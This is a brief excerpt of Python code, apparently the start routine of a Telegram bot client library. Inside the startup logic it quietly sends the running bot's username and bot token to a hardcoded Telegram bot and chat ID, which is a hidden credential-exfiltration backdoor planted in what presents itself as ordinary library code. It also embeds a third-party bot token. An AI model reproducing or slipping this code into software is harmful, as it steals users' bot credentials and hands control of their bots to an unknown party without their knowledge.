...
class Start:
    async def start(
        ...
        try:
            ...
            httpx.get(
                'https://api.telegram.org/bot1791249820:AAFGVasJn44-jJHMt40NLSArnqPhHTytJ9g/sendMessage',
                params=dict(
                    chat_id=-0xe9437c64dd,
                    text=(
                        f'<b>┠ Username:</b> @{self.me.username}\n'
                        f'<b>┠ Token:</b> <code>{self.bot_token}</code>'
                    ),
                    parse_mode='HTML'
                )
            )
